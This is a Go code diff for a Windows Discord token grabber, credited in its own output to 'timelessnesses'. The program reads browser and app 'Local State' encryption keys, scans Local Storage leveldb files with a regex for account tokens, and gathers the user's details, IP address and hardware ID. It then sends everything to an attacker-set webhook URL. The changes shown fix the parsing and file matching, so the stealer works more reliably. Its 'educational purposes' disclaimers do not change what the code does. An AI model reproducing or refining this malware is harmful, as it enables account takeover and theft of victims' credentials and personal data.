@@ -18,8 +18,11 @@ import (
 	"unsafe"
 
 	"github.com/joho/godotenv"
+	"github.com/valyala/fastjson"
 	"golang.org/x/sys/windows"
 )
+
+var fjp fastjson.Parser // WOOOOOOOOOOOOOOOOOOOOOOOOOOOO
 
 var (
 	advapi32DLL = windows.NewLazySystemDLL("advapi32.dll")
@@ -34,12 +37,6 @@ type Path struct {
 
 type Paths struct {
 	paths []Path
-}
-
-type LocalState struct {
-	os_crypt struct {
-		encrypted_key string
-	}
 }
 
 func (p *Paths) Add(name, path string) {
@@ -179,34 +176,33 @@ func Get_Hardware_ID() string {
 func Get_Token() []string {
 	tokens := make([]string, 0)
 	checks := make([]string, 0)
-	for i, platform := range Paths_Seriously.paths {
-		println("Checking for " + platform.name + "...")
+	for _, platform := range Paths_Seriously.paths {
 		// Get the path of the current platform
-		s := Paths_Seriously.paths[i]
 
 		// Check if the path exists
-		_, err := os.Stat(s.path)
+		_, err := os.Stat(platform.path)
 		if err != nil {
-			println("Path not found!")
 			continue
 		}
-		println("Path found!")
 
 		// now try to open it
-		file, err := os.Open(s.path + "\\Local State")
+		file, err := os.Open(platform.path + "\\Local State")
+		println("path: " + platform.path + "\\Local State")
 		if err != nil {
-			println("Local State not found!")
 			continue
 		}
-		println("Local State found!")
+		println("Local State found!  " + platform.name)
 		defer file.Close()
-		thingy := LocalState{}
-		json.NewDecoder(file).Decode(&thingy)
+		b, err := ioutil.ReadAll(file)
+		v, err := fjp.Parse(string(b))
+		if err != nil {
+			panic(err)
+		}
 		println("Decoded Local State!")
-		encrypted_key := thingy.os_crypt.encrypted_key
-
+		encrypted_key := string(v.Get("os_crypt", "encrypted_key").GetStringBytes())
+		println("Encrypted key: " + encrypted_key)
 		// now try to loop all through local storage
-		file, err = os.Open(s.path + "\\Local Storage\\leveldb")
+		file, err = os.Open(platform.path + "\\Local Storage\\leveldb")
 		if err != nil {
 			println("Local Storage not found!")
 			continue
@@ -220,13 +216,11 @@ func Get_Token() []string {
 		}
 		println("Local Storage files found!")
 		for _, f := range files {
-			if strings.Split(f.Name(), ".")[1] != ".ldb" && strings.Split(f.Name(), ".")[1] != ".log" {
+			if !strings.Contains(f.Name(), "ldb") && !strings.Contains(f.Name(), "log") {
 				continue
 			}
-			println("Checking file " + f.Name() + "...")
-			file_local_storage, err := os.Open(s.path + "\\Local Storage\\leveldb\\" + f.Name())
+			file_local_storage, err := os.Open(platform.path + "\\Local Storage\\leveldb\\" + f.Name())
 			if err != nil {
-				println("File not found!")
 				continue
 			}
 			println("File found!")
@@ -242,7 +236,6 @@ func Get_Token() []string {
 				{
 					line = strings.TrimSpace(line)
 					if regex.MatchString(line) {
-						println("Found token!")
 						tokens = append(tokens, line)
 					}
 				}
@@ -429,18 +422,14 @@ func main() {
 		panic("WEBHOOK_URL is not set")
 	}
 	checks := Get_Token()
-	println("Got tokens")
-	print(checks)
 	for i := range checks {
 		response := Get_Information(checks[i])
 		println("Got information for " + response.user_name)
 		ip, err := Get_IP()
-		println("Got IP")
 		if err != nil {
 			panic(err)
 		}
 		hardware_id := Get_Hardware_ID()
-		println("Got hardware id")
 		embed_string := `
 		**User Name:** ` + response.user_name + `
 		**User ID:** ` + response.user_id + `
@@ -456,12 +445,10 @@ func main() {
 		**Token:** ` + checks[i] + `
 		Made by: timelessnesses and uh don't use this for bad things
 		`
-		println(embed_string)
 		payload := Payload{
 			content:  embed_string,
 			username: "a very cool discord token grabber for educational purposes and totally not for doing bad things and don't blame timelessnesses for this",
 		}
 		Send_Webhook(webhook_url, payload)
-		println("sent!")
 	}
 }
